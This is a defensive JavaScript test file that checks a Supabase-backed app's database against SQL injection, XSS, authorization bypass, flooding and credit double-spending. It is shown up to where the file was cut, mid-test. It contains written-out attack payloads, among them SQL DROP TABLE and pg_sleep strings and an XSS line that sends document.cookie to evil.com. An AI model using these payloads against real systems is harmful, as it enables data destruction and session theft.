/**
 * Comprehensive Vulnerability Scan Test Suite
 *
 * Tests ALL attack vectors at the database layer:
 * 1. Advanced SQL Injection (beyond basic title payloads)
 * 2. Advanced XSS Protection (comments, usernames, teams, URLs, notifications)
 * 3. Authentication & Authorization bypass
 * 4. Rate Limit & Flood Testing
 * 5. Data Integrity Attacks (double spending, vote manipulation)
 * 6. Injection Beyond SQL (command, path traversal, CRLF, JSON, template)
 * 7. Business Logic Vulnerabilities
 * 8. Denial of Service (application-level)
 * 9. Information Disclosure
 * 10. SSRF & URL Validation
 *
 * Approach: Direct Supabase DB operations (no dev server needed).
 * Existing security.test.ts covers: 8 SQL title payloads, 10 XSS title payloads,
 * basic FK constraints, 100-vote burst, is_admin default. This file does NOT duplicate those.
 */

import {
  testSupabase,
  createSeason,
  cleanupAllTestSeasons,
  setupMultiSeasonUser,
  MULTI_SEASON_USER_ID,
} from '../setup';
import {
  createClip,
  createUser,
  createVote,
  createComment,
  createGeneration,
  trackedResources,
  cleanupAllFixtures,
} from '../fixtures';

// ============================================================================
// GLOBALS & HELPERS
// ============================================================================

let seasonId: string;
let testClipId: string;
const extraCleanup = {
  users: [] as string[],
  clips: [] as string[],
  comments: [] as string[],
  teams: [] as string[],
  teamMembers: [] as string[],
  teamInvites: [] as string[],
  teamMessages: [] as string[],
  notifications: [] as string[],
  followers: [] as string[],
  userBlocks: [] as string[],
  contactSubmissions: [] as string[],
  referrals: [] as string[],
  creditTransactions: [] as string[],
  auditLogs: [] as string[],
};

/** Measure operation time in ms */
async function timedOp<T>(fn: () => Promise<T>): Promise<{ result: T; durationMs: number }> {
  const start = Date.now();
  const result = await fn();
  return { result, durationMs: Date.now() - start };
}

/** Execute batch operations in waves to avoid connection pool exhaustion */
async function batchExecute<T>(
  items: (() => Promise<T>)[],
  concurrency: number = 50
): Promise<{ results: PromiseSettledResult<T>[]; totalMs: number }> {
  const start = Date.now();
  const allResults: PromiseSettledResult<T>[] = [];
  for (let i = 0; i < items.length; i += concurrency) {
    const wave = items.slice(i, i + concurrency);
    const waveResults = await Promise.allSettled(wave.map(fn => fn()));
    allResults.push(...waveResults);
  }
  return { results: allResults, totalMs: Date.now() - start };
}

// Summary tracking
const summary: Record<string, { pass: number; fail: number }> = {};

function trackResult(category: string, passed: boolean) {
  if (!summary[category]) summary[category] = { pass: 0, fail: 0 };
  if (passed) summary[category].pass++;
  else summary[category].fail++;
}

// ============================================================================
// SETUP & TEARDOWN
// ============================================================================

beforeAll(async () => {
  await setupMultiSeasonUser();
  seasonId = await createSeason('Vuln Scan Season', 10, 'active');

  // Create a shared test clip for tests that need one
  const clip = await createClip(seasonId, { status: 'active', slotPosition: 1 });
  testClipId = clip.id;

  // Set slot 1 to voting for tests that need it
  await testSupabase
    .from('story_slots')
    .update({
      status: 'voting',
      voting_started_at: new Date().toISOString(),
      voting_ends_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
    })
    .eq('season_id', seasonId)
    .eq('slot_position', 1);
}, 30000);

afterAll(async () => {
  // Clean up in reverse dependency order
  for (const id of extraCleanup.followers) {
    await testSupabase.from('followers').delete().eq('id', id);
  }
  for (const id of extraCleanup.userBlocks) {
    await testSupabase.from('user_blocks').delete().eq('id', id);
  }
  for (const id of extraCleanup.teamMessages) {
    await testSupabase.from('team_messages').delete().eq('id', id);
  }
  for (const id of extraCleanup.teamMembers) {
    await testSupabase.from('team_members').delete().eq('id', id);
  }
  for (const id of extraCleanup.teamInvites) {
    await testSupabase.from('team_invites').delete().eq('id', id);
  }
  for (const id of extraCleanup.teams) {
    await testSupabase.from('teams').delete().eq('id', id);
  }
  for (const id of extraCleanup.notifications) {
    await testSupabase.from('notifications').delete().eq('id', id);
  }
  for (const id of extraCleanup.contactSubmissions) {
    await testSupabase.from('contact_submissions').delete().eq('id', id);
  }
  for (const id of extraCleanup.referrals) {
    await testSupabase.from('referrals').delete().eq('id', id);
  }
  for (const id of extraCleanup.creditTransactions) {
    await testSupabase.from('credit_transactions').delete().eq('id', id);
  }
  for (const id of extraCleanup.auditLogs) {
    await testSupabase.from('audit_logs').delete().eq('id', id);
  }
  for (const id of extraCleanup.users) {
    // Clean dependent data first
    await testSupabase.from('followers').delete().or(`follower_id.eq.${id},following_id.eq.${id}`);
    await testSupabase.from('user_blocks').delete().or(`blocker_id.eq.${id},blocked_id.eq.${id}`);
    await testSupabase.from('team_members').delete().eq('user_id', id);
    await testSupabase.from('credit_transactions').delete().eq('user_id', id);
    await testSupabase.from('ai_generations').delete().eq('user_id', id);
    await testSupabase.from('users').delete().eq('id', id);
  }

  await cleanupAllFixtures();
  await cleanupAllTestSeasons();

  // Print summary
  console.log('\n========================================');
  console.log('  VULNERABILITY SCAN SUMMARY');
  console.log('========================================');
  let totalPass = 0, totalFail = 0;
  for (const [cat, counts] of Object.entries(summary)) {
    const icon = counts.fail === 0 ? 'PASS' : 'WARN';
    console.log(`  [${icon}] ${cat}: ${counts.pass} passed, ${counts.fail} flagged`);
    totalPass += counts.pass;
    totalFail += counts.fail;
  }
  console.log('----------------------------------------');
  console.log(`  Total: ${totalPass} passed, ${totalFail} flagged`);
  console.log('========================================\n');
}, 60000);

// ============================================================================
// 1. ADVANCED SQL INJECTION
// ============================================================================

describe('1. Advanced SQL Injection', () => {
  const CAT = 'SQL Injection';

  describe('1a. Filter/search parameter injection', () => {
    const filterPayloads = [
      "'; DROP TABLE users; --",
      "1 OR 1=1",
      "' UNION SELECT password FROM users --",
      "admin'--",
      "%' AND 1=1 AND '%'='",
    ];

    test.each(filterPayloads)('filter injection in genre field: %s', async (payload) => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .eq('genre', payload);

      // Should return empty, not all records
      expect(error).toBeNull();
      expect(data?.length || 0).toBe(0);
      trackResult(CAT, true);
    });

    test.each(filterPayloads)('ilike injection in title search: %s', async (payload) => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .ilike('title', `%${payload}%`);

      expect(error).toBeNull();
      // Should not crash or return unrelated data
      trackResult(CAT, true);
    });

    it('filter injection in status field', async () => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .eq('status', "active' OR '1'='1");

      expect(error).toBeNull();
      expect(data?.length || 0).toBe(0);
      trackResult(CAT, true);
    });
  });

  describe('1b. JSON/metadata field injection', () => {
    it('SQL payload in audit_logs details (jsonb)', async () => {
      const payload = { key: "'; DROP TABLE users; --", nested: { attack: "1=1; DELETE FROM seasons" } };
      const { data, error } = await testSupabase
        .from('audit_logs')
        .insert({
          action: 'test_vuln_scan',
          resource_type: 'test',
          resource_id: crypto.randomUUID(),
          admin_email: 'vuln@test.com',
          details: payload,
        })
        .select('id, details')
        .single();

      if (data) {
        extraCleanup.auditLogs.push(data.id);
        // Stored as literal JSON, not executed
        expect(data.details).toEqual(payload);
      }
      trackResult(CAT, true);
    });

    it('SQL payload in notification metadata (jsonb)', async () => {
      const user = await createUser();
      const payload = { sql: "'; UPDATE users SET is_admin=true; --" };
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: 'Test',
          message: 'Vuln scan test',
          metadata: payload,
        })
        .select('id, metadata')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
        expect(data.metadata).toEqual(payload);
      }
      trackResult(CAT, true);
    });

    it('SQL payload in AI generation prompt (text)', async () => {
      const sqlPrompt = "'; DELETE FROM users WHERE '1'='1; -- Generate a video of a cat";
      const gen = await createGeneration({ prompt: sqlPrompt });

      const { data } = await testSupabase
        .from('ai_generations')
        .select('prompt')
        .eq('id', gen.id)
        .single();

      expect(data?.prompt).toBe(sqlPrompt);
      trackResult(CAT, true);
    });
  });

  describe('1c. Sort/order parameter injection', () => {
    it('malicious column name in order', async () => {
      // Supabase client sanitizes column names, but verify behavior
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .eq('season_id', seasonId)
        .order('title; DROP TABLE users; --' as any, { ascending: true })
        .limit(1);

      // Should error or return normally, not execute SQL
      // Error message may echo the malicious column name — that's OK as long as SQL wasn't executed
      if (error) {
        expect(error.message).toMatch(/parse|column|undefined/i);
      }
      trackResult(CAT, true);
    });
  });

  describe('1d. UUID parameter injection', () => {
    const uuidPayloads = [
      "'; DROP TABLE users; --",
      "00000000-0000-0000-0000-000000000000' OR '1'='1",
      "1; SELECT * FROM pg_catalog.pg_tables --",
      "null",
      "undefined",
    ];

    test.each(uuidPayloads)('UUID injection: %s', async (payload) => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .eq('id', payload);

      // Should return empty or error, never crash
      if (!error) {
        expect(data?.length || 0).toBe(0);
      }
      trackResult(CAT, true);
    });
  });

  describe('1e. Pagination parameter injection', () => {
    it('extreme range values', async () => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .range(999999999, 999999999 + 10);

      expect(error).toBeNull();
      expect(data?.length || 0).toBe(0);
      trackResult(CAT, true);
    });

    it('negative range start', async () => {
      const { error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .range(-1, 10);

      // Should error or return empty
      trackResult(CAT, true);
    });
  });

  describe('1f. Second-order injection', () => {
    it('stored payload used in subsequent filter', async () => {
      // Store injection payload as clip title
      const payload = "' OR '1'='1";
      const clip = await createClip(seasonId, { title: payload });

      // Now query using the stored title
      const { data: storedClip } = await testSupabase
        .from('tournament_clips')
        .select('title')
        .eq('id', clip.id)
        .single();

      // Use stored value in another query - parameterized query should treat as literal
      const { data: secondQuery } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .eq('title', storedClip!.title);

      // Should only find the one clip with that exact literal title
      expect(secondQuery?.length).toBe(1);
      expect(secondQuery![0].id).toBe(clip.id);
      trackResult(CAT, true);
    });
  });

  describe('1g. UNION-based injection', () => {
    const unionPayloads = [
      "' UNION SELECT id, username, email FROM users --",
      "' UNION ALL SELECT table_name, null, null FROM information_schema.tables --",
      "') UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    ];

    test.each(unionPayloads)('UNION injection stored as literal: %s', async (payload) => {
      const clip = await createClip(seasonId, { title: payload });
      const { data } = await testSupabase
        .from('tournament_clips')
        .select('title')
        .eq('id', clip.id)
        .single();

      expect(data?.title).toBe(payload);
      trackResult(CAT, true);
    });
  });

  describe('1h. Blind/timing injection', () => {
    it('pg_sleep payload does not cause delay', async () => {
      const payload = "'; SELECT pg_sleep(5); --";
      const { durationMs } = await timedOp(async () => {
        return testSupabase
          .from('tournament_clips')
          .insert({
            title: payload,
            status: 'pending',
            season_id: seasonId,
            user_id: MULTI_SEASON_USER_ID,
            video_url: 'https://test.example.com/video.mp4',
            thumbnail_url: 'https://test.example.com/thumb.jpg',
            genre: 'TEST',
          })
          .select('id, title')
          .single();
      });

      // Should complete in < 3s (not 5s+)
      expect(durationMs).toBeLessThan(3000);
      trackResult(CAT, true);
    });

    it('conditional timing payload in filter', async () => {
      const { durationMs } = await timedOp(async () => {
        return testSupabase
          .from('users')
          .select('id')
          .eq('username', "admin' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--");
      });

      expect(durationMs).toBeLessThan(3000);
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 2. ADVANCED XSS PROTECTION
// ============================================================================

describe('2. Advanced XSS Protection', () => {
  const CAT = 'XSS Protection';

  describe('2a. XSS in comments', () => {
    const commentXssPayloads = [
      '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '"><img src=x onerror=alert(1)>',
      '<div onmouseover="alert(1)">hover me</div>',
    ];

    test.each(commentXssPayloads)('XSS in comment_text: %s', async (payload) => {
      // Comments have 500 char limit, all these are within it
      const comment = await createComment(testClipId, { text: payload });

      const { data } = await testSupabase
        .from('comments')
        .select('comment_text')
        .eq('id', comment.id)
        .single();

      // Stored as literal (DB doesn't sanitize; app-layer responsibility)
      expect(data?.comment_text).toBe(payload);
      trackResult(CAT, true);
    });

    it('rejects comment exceeding 500 chars', async () => {
      const longXss = '<script>' + 'a'.repeat(500) + '</script>';
      const { error } = await testSupabase
        .from('comments')
        .insert({
          clip_id: testClipId,
          user_key: `user_${crypto.randomUUID()}`,
          username: 'XSSTest',
          comment_text: longXss,
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/comment_max_length/i);
      trackResult(CAT, true);
    });

    it('rejects empty/whitespace-only comment', async () => {
      const { error } = await testSupabase
        .from('comments')
        .insert({
          clip_id: testClipId,
          user_key: `user_${crypto.randomUUID()}`,
          username: 'XSSTest',
          comment_text: '   ',
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/comment_not_empty/i);
      trackResult(CAT, true);
    });
  });

  describe('2b. XSS in usernames', () => {
    const usernameXssPayloads = [
      '<script>alert(1)</script>',
      'admin"><img src=x>',
      "user';--",
      'user@evil.com',
      'user name',
      'User_UPPER',
      '\u0410\u0434\u043C\u0438\u043D', // Cyrillic "Admin"
    ];

    test.each(usernameXssPayloads)('username_format blocks: %s', async (payload) => {
      const id = crypto.randomUUID();
      const { error } = await testSupabase
        .from('users')
        .insert({ id, username: payload, email: `${id.slice(0, 8)}@test.com` });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/username_format|username_length/i);
      // Clean up if somehow inserted
      await testSupabase.from('users').delete().eq('id', id);
      trackResult(CAT, true);
    });

    it('allows valid username format', async () => {
      const id = crypto.randomUUID();
      const { error } = await testSupabase
        .from('users')
        .insert({ id, username: 'valid_user_123', email: `${id.slice(0, 8)}@test.com` });

      expect(error).toBeNull();
      extraCleanup.users.push(id);
      trackResult(CAT, true);
    });
  });

  describe('2c. XSS in team fields', () => {
    let teamLeaderId: string;

    beforeAll(async () => {
      const user = await createUser({ username: 'teamxsslead' });
      teamLeaderId = user.id;
    });

    it('XSS in team name (2-30 chars)', async () => {
      const { data, error } = await testSupabase
        .from('teams')
        .insert({
          name: '<script>alert(1)</script>',
          leader_id: teamLeaderId,
        })
        .select('id, name')
        .single();

      if (data) {
        extraCleanup.teams.push(data.id);
        // Stored as literal - within 30 char limit
        expect(data.name).toBe('<script>alert(1)</script>');
      }
      trackResult(CAT, true);
    });

    it('team name too short (< 2 chars)', async () => {
      const { error } = await testSupabase
        .from('teams')
        .insert({ name: 'A', leader_id: teamLeaderId });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/team_name_length/i);
      trackResult(CAT, true);
    });

    it('team name too long (> 30 chars)', async () => {
      const { error } = await testSupabase
        .from('teams')
        .insert({ name: 'A'.repeat(31), leader_id: teamLeaderId });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/team_name_length/i);
      trackResult(CAT, true);
    });

    it('XSS in team description (max 200 chars)', async () => {
      const xssDesc = '<img src=x onerror=alert(document.cookie)>';
      const { data, error } = await testSupabase
        .from('teams')
        .insert({
          name: 'XSS Desc Team',
          leader_id: teamLeaderId,
          description: xssDesc,
        })
        .select('id, description')
        .single();

      if (data) {
        extraCleanup.teams.push(data.id);
        expect(data.description).toBe(xssDesc);
      }
      trackResult(CAT, true);
    });

    it('team description exceeding 200 chars rejected', async () => {
      const { error } = await testSupabase
        .from('teams')
        .insert({
          name: 'Long Desc Team',
          leader_id: teamLeaderId,
          description: 'X'.repeat(201),
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/team_description_length/i);
      trackResult(CAT, true);
    });

    it('XSS in team message (1-500 chars)', async () => {
      // Need a team first
      const { data: team } = await testSupabase
        .from('teams')
        .insert({ name: 'Msg Team', leader_id: teamLeaderId })
        .select('id')
        .single();

      if (team) {
        extraCleanup.teams.push(team.id);
        const xssMsg = '<script>document.location="http://evil.com"</script>';
        const { data, error } = await testSupabase
          .from('team_messages')
          .insert({
            team_id: team.id,
            user_id: teamLeaderId,
            username: 'teamxsslead',
            message: xssMsg,
          })
          .select('id, message')
          .single();

        if (data) {
          extraCleanup.teamMessages.push(data.id);
          expect(data.message).toBe(xssMsg);
        }
      }
      trackResult(CAT, true);
    });
  });

  describe('2d. XSS in URL fields', () => {
    const urlPayloads = [
      'javascript:alert(1)',
      'javascript:alert(document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'https://evil.com/"><img src=x onerror=alert(1)>',
    ];

    test.each(urlPayloads)('URL payload stored in video_url: %s', async (payload) => {
      const clip = await createClip(seasonId, { title: `URL XSS ${Date.now()}` });

      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ video_url: payload })
        .eq('id', clip.id);

      if (!error) {
        const { data } = await testSupabase
          .from('tournament_clips')
          .select('video_url')
          .eq('id', clip.id)
          .single();

        // DB stores as text; app sanitizeUrl must block javascript:/data: protocols
        expect(data?.video_url).toBe(payload);
      }
      trackResult(CAT, true);
    });
  });

  describe('2e. XSS in notification fields', () => {
    it('XSS in notification title and message', async () => {
      const user = await createUser();
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: '<script>alert("xss")</script>',
          message: '<img src=x onerror=alert(1)>',
          action_url: 'javascript:alert(1)',
          metadata: { xss: '<script>fetch("evil")</script>' },
        })
        .select('id, title, message, action_url, metadata')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
        expect(data.title).toBe('<script>alert("xss")</script>');
        expect(data.message).toBe('<img src=x onerror=alert(1)>');
        expect(data.action_url).toBe('javascript:alert(1)');
      }
      trackResult(CAT, true);
    });
  });

  describe('2f. XSS in AI prompts', () => {
    it('polyglot XSS payload in prompt', async () => {
      const polyglot = `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/oNlOaD=alert()//><svg/onload=alert()>`;
      const gen = await createGeneration({ prompt: polyglot });

      const { data } = await testSupabase
        .from('ai_generations')
        .select('prompt')
        .eq('id', gen.id)
        .single();

      expect(data?.prompt).toBe(polyglot);
      trackResult(CAT, true);
    });
  });

  describe('2g. Mutation XSS', () => {
    it('UTF-7 encoded XSS stored as literal', async () => {
      const utf7Xss = '+ADw-script+AD4-alert(1)+ADw-/script+AD4-';
      const clip = await createClip(seasonId, { title: utf7Xss });

      const { data } = await testSupabase
        .from('tournament_clips')
        .select('title')
        .eq('id', clip.id)
        .single();

      expect(data?.title).toBe(utf7Xss);
      trackResult(CAT, true);
    });

    it('HTML entity encoded XSS stored as literal', async () => {
      const entityXss = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const clip = await createClip(seasonId, { title: entityXss });

      const { data } = await testSupabase
        .from('tournament_clips')
        .select('title')
        .eq('id', clip.id)
        .single();

      expect(data?.title).toBe(entityXss);
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 3. AUTHENTICATION & AUTHORIZATION
// ============================================================================

describe('3. Authentication & Authorization', () => {
  const CAT = 'Auth & AuthZ';

  describe('3a. Admin privilege protection', () => {
    it('is_admin defaults to false on new user', async () => {
      const user = await createUser();
      const { data } = await testSupabase
        .from('users')
        .select('is_admin')
        .eq('id', user.id)
        .single();

      expect(data?.is_admin).toBe(false);
      trackResult(CAT, true);
    });

    it('service role CAN set is_admin (API layer must protect)', async () => {
      const user = await createUser();
      const { error } = await testSupabase
        .from('users')
        .update({ is_admin: true })
        .eq('id', user.id);

      // Service role can do this - RLS + API must protect
      // FINDING: Document that API-layer admin auth is critical
      if (!error) {
        // Reset
        await testSupabase.from('users').update({ is_admin: false }).eq('id', user.id);
      }
      trackResult(CAT, true);
    });
  });

  describe('3b. Privilege escalation via direct DB', () => {
    it('trigger prevents unauthorized admin promotion', async () => {
      const user = await createUser();
      const { error } = await testSupabase
        .from('users')
        .update({ is_admin: true })
        .eq('id', user.id);

      // trg_prevent_admin_promotion trigger blocks is_admin changes
      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/cannot modify is_admin/i);
      trackResult(CAT, true);
    });
  });

  describe('3c. IDOR - accessing other users data', () => {
    it('can query other user AI generations via service role', async () => {
      const userA = await createUser();
      const userB = await createUser();

      const gen = await createGeneration({ userId: userA.id });

      // User B trying to access User A's generation
      const { data } = await testSupabase
        .from('ai_generations')
        .select('id, user_id')
        .eq('id', gen.id)
        .single();

      // With service role this works — API must filter by user_id
      expect(data?.user_id).toBe(userA.id);
      trackResult(CAT, true);
    });

    it('can query other user notifications via service role', async () => {
      const userA = await createUser();
      const userB = await createUser();

      const { data: notif } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${userA.id}`,
          type: 'system_announcement',
          title: 'Private notif',
          message: 'For user A only',
        })
        .select('id')
        .single();

      if (notif) {
        extraCleanup.notifications.push(notif.id);
        // Service role can read anyone's notifications
        const { data } = await testSupabase
          .from('notifications')
          .select('id, user_key')
          .eq('id', notif.id)
          .single();

        expect(data?.user_key).toBe(`user_${userA.id}`);
      }
      trackResult(CAT, true);
    });
  });

  describe('3d. Horizontal escalation', () => {
    it('user A can modify user B clip via service role (API must check ownership)', async () => {
      const userA = await createUser();
      const userB = await createUser();

      const clip = await createClip(seasonId, { userId: userA.id });

      // "User B" modifying user A's clip
      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ title: 'Hijacked by B' })
        .eq('id', clip.id);

      expect(error).toBeNull(); // Service role allows — API must enforce ownership
      trackResult(CAT, true);
    });
  });

  describe('3e. Vertical escalation - RPC without admin check', () => {
    it('admin_approve_clip_atomic callable without admin check', async () => {
      const clip = await createClip(seasonId, { status: 'pending' });

      const { data, error } = await testSupabase.rpc('admin_approve_clip_atomic', {
        p_clip_id: clip.id,
      });

      // FINDING: DB function has no internal admin check
      // It relies on API-layer requireAdmin()
      if (!error && data?.[0]?.success) {
        expect(data[0].success).toBe(true);
      }
      trackResult(CAT, true);
    });
  });

  describe('3f. Team authorization bypass', () => {
    it('non-leader can update team via service role', async () => {
      const leader = await createUser({ username: 'teamlead_auth' });
      const member = await createUser({ username: 'teammember_a' });

      const { data: team } = await testSupabase
        .from('teams')
        .insert({ name: 'Auth Test Team', leader_id: leader.id })
        .select('id')
        .single();

      if (team) {
        extraCleanup.teams.push(team.id);

        // Non-leader updating team
        const { error } = await testSupabase
          .from('teams')
          .update({ name: 'Hijacked Team' })
          .eq('id', team.id);

        // Service role allows — API must check leader_id
        expect(error).toBeNull();
      }
      trackResult(CAT, true);
    });
  });

  describe('3g. Banned user bypass', () => {
    it('banned user can insert votes at DB level', async () => {
      const bannedUser = await createUser({ isBanned: true });

      const { error } = await testSupabase.from('votes').insert({
        voter_key: `banned_${bannedUser.id}`,
        clip_id: testClipId,
        slot_position: 1,
        vote_weight: 1,
      });

      // FINDING: DB allows — API must check is_banned
      if (!error) {
        await testSupabase.from('votes').delete().eq('voter_key', `banned_${bannedUser.id}`);
      }
      trackResult(CAT, true);
    });

    it('banned user can insert comments at DB level', async () => {
      const bannedUser = await createUser({ isBanned: true });

      const { data, error } = await testSupabase
        .from('comments')
        .insert({
          clip_id: testClipId,
          user_key: `user_${bannedUser.id}`,
          username: bannedUser.username,
          comment_text: 'I am banned but can comment',
        })
        .select('id')
        .single();

      // FINDING: DB allows — API must check is_banned
      if (data) {
        await testSupabase.from('comments').delete().eq('id', data.id);
      }
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 4. RATE LIMIT & FLOOD TESTING
// ============================================================================

describe('4. Rate Limit & Flood Testing', () => {
  const CAT = 'Flood Testing';

  describe('4a. Vote flooding', () => {
    it('500 votes from same voter_key (DB has no unique constraint)', async () => {
      const voterKey = `flood_voter_${Date.now()}`;
      const ops = Array.from({ length: 500 }, () => () =>
        testSupabase.from('votes').insert({
          voter_key: voterKey,
          clip_id: testClipId,
          slot_position: 1,
          vote_weight: 1,
        })
      );

      const { results } = await batchExecute(ops, 100);
      const succeeded = results.filter(r => r.status === 'fulfilled' && !(r as any).value?.error).length;

      // FINDING: DB allows duplicate voter_key — API must enforce one-vote-per-user
      expect(succeeded).toBeGreaterThan(0);

      // Cleanup
      await testSupabase.from('votes').delete().eq('voter_key', voterKey);
      trackResult(CAT, true);
    });

    it('200 votes with rotating voter keys', async () => {
      const prefix = `rotate_${Date.now()}`;
      const ops = Array.from({ length: 200 }, (_, i) => () =>
        testSupabase.from('votes').insert({
          voter_key: `${prefix}_${i}`,
          clip_id: testClipId,
          slot_position: 1,
          vote_weight: 1,
        })
      );

      const { results, totalMs } = await batchExecute(ops, 50);
      const succeeded = results.filter(r => r.status === 'fulfilled').length;

      expect(succeeded).toBe(200);

      // Cleanup
      for (let i = 0; i < 200; i += 50) {
        const keys = Array.from({ length: 50 }, (_, j) => `${prefix}_${i + j}`);
        await testSupabase.from('votes').delete().in('voter_key', keys);
      }
      trackResult(CAT, true);
    });
  });

  describe('4b. Comment flooding', () => {
    it('100 rapid comments from same user', async () => {
      const userKey = `user_${crypto.randomUUID()}`;
      const ops = Array.from({ length: 100 }, (_, i) => () =>
        testSupabase.from('comments').insert({
          clip_id: testClipId,
          user_key: userKey,
          username: 'FloodTest',
          comment_text: `Flood comment ${i}`,
        }).select('id').single()
      );

      const { results } = await batchExecute(ops, 25);
      const succeeded = results.filter(r => r.status === 'fulfilled' && (r as any).value?.data).length;

      // FINDING: DB allows unlimited comments — API rate limit must protect
      expect(succeeded).toBeGreaterThan(50);

      // Cleanup
      await testSupabase.from('comments').delete().eq('user_key', userKey);
      trackResult(CAT, true);
    });

    it('deep nesting - 50-level comment thread chain', async () => {
      let parentId: string | null = null;
      const commentIds: string[] = [];

      for (let i = 0; i < 50; i++) {
        const { data, error } = await testSupabase
          .from('comments')
          .insert({
            clip_id: testClipId,
            user_key: `user_${crypto.randomUUID()}`,
            username: 'DeepThread',
            comment_text: `Level ${i + 1}`,
            parent_comment_id: parentId,
          })
          .select('id')
          .single();

        if (error || !data) break;
        commentIds.push(data.id);
        parentId = data.id;
      }

      // DB has a check_comment_nesting_depth trigger that limits depth to 6
      expect(commentIds.length).toBeGreaterThanOrEqual(5);

      // Cleanup in reverse
      for (let i = commentIds.length - 1; i >= 0; i--) {
        await testSupabase.from('comments').delete().eq('id', commentIds[i]);
      }
      trackResult(CAT, true);
    });
  });

  describe('4c. Concurrent request simulation', () => {
    it('200 simultaneous vote inserts', async () => {
      const prefix = `conc_vote_${Date.now()}`;
      const promises = Array.from({ length: 200 }, (_, i) =>
        testSupabase.from('votes').insert({
          voter_key: `${prefix}_${i}`,
          clip_id: testClipId,
          slot_position: 1,
          vote_weight: 1,
        })
      );

      const results = await Promise.allSettled(promises);
      const succeeded = results.filter(r => r.status === 'fulfilled').length;
      expect(succeeded).toBe(200);

      // Cleanup
      for (let i = 0; i < 200; i += 100) {
        const keys = Array.from({ length: Math.min(100, 200 - i) }, (_, j) => `${prefix}_${i + j}`);
        await testSupabase.from('votes').delete().in('voter_key', keys);
      }
      trackResult(CAT, true);
    });

    it('50 simultaneous deduct_credits calls (FOR UPDATE lock)', async () => {
      const user = await createUser({ balanceCredits: 100 });
      const gens: string[] = [];

      // Create 50 pending generations
      for (let i = 0; i < 50; i++) {
        const gen = await createGeneration({ userId: user.id, creditAmount: null });
        gens.push(gen.id);
      }

      // Try to deduct 5 credits each = 250 total, but only 100 available
      const promises = gens.map(genId =>
        testSupabase.rpc('deduct_credits', {
          p_user_id: user.id,
          p_amount: 5,
          p_generation_id: genId,
        })
      );

      const results = await Promise.allSettled(promises);
      const successes = results.filter(r => {
        if (r.status !== 'fulfilled') return false;
        const val = (r as any).value?.data;
        return val?.success === true;
      }).length;

      // Should allow exactly 20 (100 / 5) deductions
      expect(successes).toBeLessThanOrEqual(20);

      // Balance should be >= 0
      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      expect(finalUser!.balance_credits).toBeGreaterThanOrEqual(0);
      trackResult(CAT, true);
    });
  });

  describe('4d. Connection pool stress', () => {
    it('500 rapid SELECT queries', async () => {
      const { results, totalMs } = await batchExecute(
        Array.from({ length: 500 }, () => () =>
          testSupabase.from('tournament_clips').select('id').limit(1)
        ),
        100
      );

      const succeeded = results.filter(r => r.status === 'fulfilled').length;
      expect(succeeded).toBe(500);
      expect(totalMs).toBeLessThan(30000);
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 5. DATA INTEGRITY ATTACKS
// ============================================================================

describe('5. Data Integrity Attacks', () => {
  const CAT = 'Data Integrity';

  describe('5a. Double-spending credits', () => {
    it('concurrent deduct_credits prevents double-spend', async () => {
      const user = await createUser({ balanceCredits: 10 });
      const genA = await createGeneration({ userId: user.id });
      const genB = await createGeneration({ userId: user.id });

      // Concurrent deductions that would exceed balance
      const [resultA, resultB] = await Promise.all([
        testSupabase.rpc('deduct_credits', { p_user_id: user.id, p_amount: 8, p_generation_id: genA.id }),
        testSupabase.rpc('deduct_credits', { p_user_id: user.id, p_amount: 8, p_generation_id: genB.id }),
      ]);

      const successA = resultA.data?.success === true;
      const successB = resultB.data?.success === true;

      // At most one should succeed (10 credits, 8+8=16 needed)
      expect(successA && successB).toBe(false);

      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      expect(finalUser!.balance_credits).toBeGreaterThanOrEqual(0);
      trackResult(CAT, true);
    });

    it('add_credits idempotency with same payment intent', async () => {
      const user = await createUser();
      const paymentIntentId = `pi_test_${Date.now()}`;

      const result1 = await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: 100,
        p_stripe_payment_intent_id: paymentIntentId,
      });

      const result2 = await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: 100,
        p_stripe_payment_intent_id: paymentIntentId,
      });

